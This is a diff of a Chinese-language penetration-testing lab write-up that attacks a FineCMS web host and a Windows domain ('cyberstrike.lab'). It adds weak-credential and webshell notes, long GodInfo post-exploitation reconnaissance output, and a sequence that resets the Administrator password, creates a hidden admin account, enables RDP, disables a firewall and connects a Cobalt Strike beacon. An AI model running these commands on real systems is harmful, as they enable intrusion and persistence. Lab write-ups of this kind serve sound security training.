@@ -192,6 +192,8 @@ start vulscan
 
 根据页脚信息，确定版本信息 `FineCMS公益软件 v5.1.0`
 
+弱口令 `admin:admin`
+
 由于网站配置问题，现有的 `FineCMS` 文件上传漏洞都是无权限写入导致不可用
 
 ![img](img/image_20251030-233002.png)
@@ -201,6 +203,8 @@ start vulscan
 sql 注入也是可以的，但是权限不是 root 也不好用
 
 参考另外一个路子 [FineCMS v5.4.1 后台 getshell - \_昏鸦 - 博客园](https://www.cnblogs.com/hun-ya/p/9392211.html)
+
+后台地址 `http://10.20.30.5:8008/admin.php`
 
 在修改后台域名的地方直接植入 webshell
 
@@ -600,17 +604,315 @@ PS D:\_Tools> .\Adinfo_win.exe -d cyberstrike.lab -u CSLAB$ -H 305950dcf3677fc31
 [i] Execution took 2.7696917s
 ```
 
-## DC - 尝试
+很明显，考点不在 windows 本身上
+
+## cslab - GodInfo
+
+直接以 `nt authority\system` 权限运行 GodInfo
 
 ```shell
-┌──(randark㉿kali)-[~]
-└─$ proxychains nxc smb 10.20.30.66 -u CSLAB$ -H 305950dcf3677fc31893b65bad94999b -M smbghost
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-SMB         10.20.30.66     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:cyberstrike.lab) (signing:True) (SMBv1:True) 
-SMB         10.20.30.66     445    DC               [+] cyberstrike.lab\CSLAB$:305950dcf3677fc31893b65bad94999b 
-SMBGHOST    10.20.30.66     445    DC               Potentially vulnerable to SMBGhost (CVE-2020-0796)
+C:\phpstudy_pro\WWW\finecms> GodInfo.exe all -log -zip
+ +--------------------------------------------+
+ |   ____           _  ___        __          |
+ |  / ___|___   __| |/_ _|_ __  / _| ___      |
+ | | |  _/ _ \ / _` | | || '_ \| |_ / _ \     |
+ | | |_| | (_) | (_| | | || | | |  _| (_) |   |
+ |  \____\___/ \__,_|\___|_| |_|_|  \___/     |
+ |                                            |
+ |           GodInfo V1.0 By Conan&小黑       |
+ +--------------------------------------------+
+>>>>>>>> Collecting Target Machine Information <<<<<<<<
+IsAdmin：True
+Whoami: SYSTEM
+IPv4Addr: 10.20.30.5
+Domain: CYBERSTRIKE
+HostName: CSLAB
+TimeZone: 中国标准时间
+LocalTime: 2025/11/8 14:11:47
+OSVersion: Microsoft Windows Server 2016 Standard
+OSInstall: 2025/7/11 11:25:39
+LastBootUp: 2025/11/8 13:50:38
+Drives: C:\
+Path: C:\phpstudy_pro\WWW\finecms
+DotNet: 4.0.30319.42000
+BIOS: SeaBIOS
+CPUS: 1 Count  MEMS: 1 GB
+Disk: 39.51 GB
+Arch: 
+>>>>>>>>>>>>>>>>>>>>> UserAccount <<<<<<<<<<<<<<<<<<<<<
+Domain       Name            Status    SID                                          
+-----------  --------------  --------  ---------------------------------------------
+CSLAB        Administrator   OK        S-1-5-21-1569229255-3439354803-3019667840-500
+CSLAB        DefaultAccount  Degraded  S-1-5-21-1569229255-3439354803-3019667840-503
+CSLAB        Guest           Degraded  S-1-5-21-1569229255-3439354803-3019667840-501
+CYBERSTRIKE  Administrator   OK        S-1-5-21-64854050-1587546430-3649469574-500  
+CYBERSTRIKE  Guest           Degraded  S-1-5-21-64854050-1587546430-3649469574-501  
+CYBERSTRIKE  krbtgt          Degraded  S-1-5-21-64854050-1587546430-3649469574-502  
+CYBERSTRIKE  cslab           Degraded  S-1-5-21-64854050-1587546430-3649469574-1104 
+>>>>>>>>>>>>>>>>> Defender Exclusions <<<<<<<<<<<<<<<<<
+Antivirus: N/A
+[*] Extensions:
+    No values.
+[*] Paths:
+    No values.
+[*] Processes:
+    No values.
+[*] TemporaryPaths:
+    No values.
+>>>>>>>>>>>>>>> 360 Security Trust Zone <<<<<<<<<<<<<<<
+[-] 360 Security log directory not found: C:\Windows\system32\config\systemprofile\AppData\Roaming\360Safe\360ScanLog\
+>>>>>>>>>>>>>>>> Environment Variable <<<<<<<<<<<<<<<<<
+[+] System Environment Variable Path:
+  %USERPROFILE%\AppData\Local\Microsoft\WindowsApps
+  
+[+] Microsoft.NET Versions Installed:
+  C:\Windows\Microsoft.NET\Framework\v1.0.3705
+  C:\Windows\Microsoft.NET\Framework\v1.1.4322
+  C:\Windows\Microsoft.NET\Framework\v2.0.50727
+  C:\Windows\Microsoft.NET\Framework\v4.0.30319
+>>>>>>>>>> Remote Desktop Sessions (QWinSta) <<<<<<<<<<
+会话名     用户名  ID  状态  类型    设备
+---------  ------  --  ----  ------  ----
+>services              0     断开        
+console                1     已连接      
+>>>>>>>>>>>>>>>>>>> Marked Process <<<<<<<<<<<<<<<<<<<<
+ProcessName  PID   Arch  Note          
+-----------  ----  ----  --------------
+mysqld.exe   1776  x64   mysql         
+php-cgi.exe  2180  x86   php           
+php-cgi.exe  2148  x86   php           
+php-cgi.exe  1068  x86   php           
+php-cgi.exe  1640  x86   php           
+php-cgi.exe  6432  x86   php           
+php-cgi.exe  7064  x86   php           
+spoolsv.exe  1464  x64   打印机驱动程序
+>>>>>>>>>>>>>>>>>> Wi-Fi Credential  <<<<<<<<<<<<<<<<<<
+[-] Error: 无法加载 DLL“Wlanapi.dll”: 找不到指定的模块。 (异常来自 HRESULT:0x8007007E)。
+[*] This is probably a virtual machine.
+>>>>>>>>>>>>>>>>>>> VPN Credential <<<<<<<<<<<<<<<<<<<<
+[-] 未找到VPN或拨号连接配置 (rasphone.pbk文件不存在)。
+>>>>>>>>>>>>>>>>>>>> Network Info <<<<<<<<<<<<<<<<<<<<<
+[+] Total 1 IPv4 Addresses: 10.20.30.5
+================== Network Interface ==================
+[+] List 3 NetworkInterfaces:
+  Interface1 .......: 以太网实例 0 - Ethernet
+  IP Address .......: [fe80::c5c:af33:a599:3d27%3] [10.20.30.5] 
+  DNS Address ......: [10.20.30.66] 
+  Interface2 .......: Loopback Pseudo-Interface 1 - Loopback
+  IP Address .......: [::1] [127.0.0.1] 
+  DNS Address ......: [fec0:0:0:ffff::1%1] [fec0:0:0:ffff::2%1] [fec0:0:0:ffff::3%1] 
+================ Active TcpConnections ================
+  10.20.30.5:8008 -- 10.20.30.7:43620
+  10.20.30.5:8008 -- 10.20.30.7:43622
+  10.20.30.5:8008 -- 10.20.30.7:43624
+  10.20.30.5:8008 -- 10.20.30.7:43626
+  10.20.30.5:8008 -- 10.20.30.7:43630
+  10.20.30.5:8008 -- 10.20.30.7:43632
+  10.20.30.5:8008 -- 10.20.30.7:43636
+  10.20.30.5:8008 -- 10.20.30.7:43638
+  10.20.30.5:8008 -- 10.20.30.7:43640
+  10.20.30.5:8008 -- 10.20.30.7:43642
+  10.20.30.5:8008 -- 10.20.30.7:43644
+  10.20.30.5:8008 -- 10.20.30.7:43646
+  10.20.30.5:8008 -- 10.20.30.7:43648
+  10.20.30.5:8008 -- 10.20.30.7:43650
+  10.20.30.5:49714 -- 10.20.30.66:139
+  10.20.30.5:49717 -- 10.20.30.66:139
+  10.20.30.5:49718 -- 10.20.30.66:139
+  10.20.30.5:49719 -- 10.20.30.66:445
+  ::1:49713 -- ::1:3306
+  ::1:49715 -- ::1:3306
+>>>>>>>>>>>>>>>>>>>>>>> RdpInfo <<<<<<<<<<<<<<<<<<<<<<<
+[-] RDP is disabled
+================= RDP OutConnections ==================
+================== RDP InConnections ==================
+>>>>>>>>>>>>>>>>>> Software Install <<<<<<<<<<<<<<<<<<<
+Name           Version         Install Path                                Install Date
+-------------  --------------  ------------------------------------------  ------------
+Google Chrome  140.0.7339.128  C:\Program Files\Google\Chrome\Application  20250914    
+=================== User Softwares ====================
+  [ phpstudy集成环境 ] -- 8.1.1.3
+================== System Softwares ===================
+>>>>>>>>>>>>>>>>>>>>>> HostsFile <<<<<<<<<<<<<<<<<<<<<<
+[*] localhost --- 127.0.0.1 
+>>>>>>>>>>>>>>>>>>>>> RecentFile <<<<<<<<<<<<<<<<<<<<<<
+[*] C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Recent
+[-]ERROR: System.IO.DirectoryNotFoundException: 未能找到路径“C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Recent”的一部分。
+   在 System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+   在 System.IO.FileSystemEnumerableIterator`1.CommonInit()
+   在 System.IO.DirectoryInfo.InternalGetFiles(String searchPattern, SearchOption searchOption)
+   在 GodInfo.Commands.UserFileInfoCommand.RecentFile()
+>>>>>>>>>>>>>>>>>>>> UserFileInfo <<<<<<<<<<<<<<<<<<<<<
+[*] Hunting all user desktops and download folders.
+=============== C:\Users\Administrator ================
+[*] C:\Users\Administrator\Desktop
+   [ 2025/7/11 11:25:57 ] -- C:\Users\Administrator\Desktop\desktop.ini
+[*] C:\Users\Administrator\Downloads
+   [ 2025/7/11 11:25:57 ] -- C:\Users\Administrator\Downloads\desktop.ini
+   [ 2025/9/14 13:24:16 ] -- C:\Users\Administrator\Downloads\finecms-master.zip
+   [ 2025/8/27 20:11:59 ] -- C:\Users\Administrator\Downloads\phpstudy_x64_8.1.1.3.exe
+[+] Find RDPCredFile: C:\Users\Administrator\AppData\Local\Microsoft\Credentials
+=================== C:\Users\Public ===================
+[*] C:\Users\Public\Desktop
+   [ 2016/7/16 21:23:24 ] -- C:\Users\Public\Desktop\desktop.ini
+   [ 2025/9/3 18:09:29 ] -- C:\Users\Public\Desktop\Google Chrome.lnk
+   [ 2025/8/27 20:13:22 ] -- C:\Users\Public\Desktop\phpstudy_pro.lnk
+[*] C:\Users\Public\Downloads
+   [ 2016/7/16 21:23:24 ] -- C:\Users\Public\Downloads\desktop.ini
+>>>>>>>>>>>>>>>>>>>>>> Info Mode <<<<<<<<<<<<<<<<<<<<<<
+[*] Collecting clipboard contents.
+>>>>>>>>>>>>>>>>> Clipboard Contents <<<<<<<<<<<<<<<<<<
+[-] No supported data formats found in clipboard.
+>>>>>>>>>>>>> Command History Information <<<<<<<<<<<<<
+[*] Collecting command history information from various sources...
+============= PowerShell Command History ==============
+[-] PowerShell history file not found
+========= CMD Command History (From Registry) =========
+[-] Run command history registry key not found
+====== Console Command History (From Event Logs) ======
+[-] No command history found in event logs
+===== PSReadLine History (Multiple User Profiles) =====
+[-] Users directory not found or not accessible
+>>>>>>>>>>>>>> Run Command History (MRU) <<<<<<<<<<<<<<
+[*] Collecting Run command history (MRU) for all users...
+[-] No Run MRU history found
+>>>>>>>>>>>>>>>>>>>>>> Info Mode <<<<<<<<<<<<<<<<<<<<<<
+[*] Collecting IIS server information.
+=================== IIS Information ===================
+[-] IIS is not installed on this system.
+>>>>>>>>>>>> Hunting Software Credentials <<<<<<<<<<<<<
+[-] Not found installed software: ToDesk
+[-] Not found running process: ToDesk.exe
+[-] Not found installed software: 向日葵远程控制
+[-] Not found running process: SunloginClient.exe
+[-] Not found installed software: 微信
+[-] Not found running process: wechat.exe
+[-] Not found running process: finalshell.exe
+[-] Not met additional condition.
+[-] Not found installed software: FileZilla
+[-] Not found running process: filezilla.exe
+[-] Not met additional condition.
+[-] Not found installed software: MobaXterm
+[-] Not found running process: MobaXterm
+[-] Not met additional condition.
+[+] Hunted installed software: Chrome
+[-] Not found installed software: Firefox
+[-] Not found installed software: Mozilla Firefox
+[-] Not found running process: firefox.exe
+[-] Not met additional condition.
+[-] Not found installed software: DBeaver
+[-] Not found running process: dbeaver.exe
+[-] Not found running process: dbeaver64.exe
+[-] Not met additional condition.
+[-] Not found installed software: WinSCP
+[-] Not found running process: WinSCP.exe
+[-] Not met additional condition.
+[-] Not found installed software: HeidiSQL
+[-] Not found running process: heidisql.exe
+[-] Not met additional condition.
+[-] Not found installed software: Navicat Premium
+[-] Not found installed software: Navicat
+[-] Not found running process: navicat.exe
+[-] Not found running process: navicatw.exe
+[-] Not met additional condition.
+[-] Not found installed software: PL/SQL Developer
+[-] Not found installed software: PLSQL Developer
+[-] Not found running process: plsqldev.exe
+[-] Not met additional condition.
+[-] Not found installed software: SQLyog
+[-] Not found running process: SQLyog.exe
+[-] Not found running process: SQLyogCommunity.exe
+[-] Not met additional condition.
+[-] Not found installed software: SecureCRT
+[-] Not found installed software: VanDyke SecureCRT
+[-] Not found running process: SecureCRT.exe
+[-] Not met additional condition.
+[-] Not found installed software: Xmanager
+[-] Not found installed software: Xshell
+[-] Not found installed software: Xftp
+[-] Not found running process: Xshell.exe
+[-] Not found running process: Xftp.exe
+[-] Not found running process: Xmanager.exe
+[-] Not met additional condition.
+[-] Not found installed software: Microsoft Pinyin
+[-] Not found installed software: Windows
+[-] Not found running process: ChsIME.exe
+[-] Not met additional condition.
+[-] Not found installed software: TeamViewer
+[-] Not found running process: TeamViewer.exe
+[-] Not found installed software: 网易云音乐
+[-] Not found installed software: NetEase Cloud Music
+[-] Not found installed software: CloudMusic
+[-] Not found running process: cloudmusic.exe
+[-] Not met additional condition.
+[-] Error while capturing screen {X=0,Y=0,Width=1024,Height=768}: 句柄无效。
+>>>>>>>>>>>>>>>>>>>>> DomainInfo <<<<<<<<<<<<<<<<<<<<<<
+[*] Current Domain: cyberstrike.lab
+[*] Domain SID: S-1-5-21-64854050-1587546430-3649469574
+[*] ms-DS-MachineAccountQuota: 10
+================= Domain Controllers ==================
+[*] Hunted 1 Domain Controllers:
+  [*] This is a Parent Domain Controller!
+  [+] Domain: cyberstrike.lab
+  [+] DC-FQDN: DC.cyberstrike.lab
+  [+] DC-IP: 10.20.30.66
+  [+] DC-OS: Windows Server 2022 Standard
+[+] LogFilePath: C:\Windows\HunterLogs\HuntingAll_2025-11-08_14-11-47.log
+[*] Hunt End: 3.6624182 s
+[+] Compressed: C:\Windows\HunterLogs.zip
 ```
 
-TODO 未攻破
+问题是，Chrome 的凭据提取需要目标用户的上下文才可以读取
+
+暴力一点，直接查看用户并修改密码
+
+```shell
+C:\phpstudy_pro\WWW\finecms> net user
+\\ 的用户帐户
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+命令运行完毕，但发生一个或多个错误。
+ 
+C:\phpstudy_pro\WWW\finecms> net user /domain
+这项请求将在域 cyberstrike.lab 的域控制器处理。
+\\DC.cyberstrike.lab 的用户帐户
+-------------------------------------------------------------------------------
+Administrator            cslab                    Guest                    
+krbtgt                   
+命令运行完毕，但发生一个或多个错误。
+
+C:\phpstudy_pro\WWW\finecms> net user Administrator Admin123###
+命令成功完成。
+```
+
+同时启用 RDP
+
+```shell
+net user randark Admin123### /add
+net localgroup administrators randark /add
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+net start termservice
+```
+
+既然都已经 RDP 了，直接在 Chrome 界面查看
+
+![img](img/image_20251119-221919.png)
+
+说实话，不对劲
+
+尝试直接上线cs
+
+首先需要将入口机的防火墙关闭
+
+```shell
+(remote) root@localhost.localdomain:/root# systemctl stop firewalld
+```
+
+然后转发cs监听端口并上线
+
+![img](img/image_20251130-223059.png)
+
+但是浏览器中还是没有东西
+
+
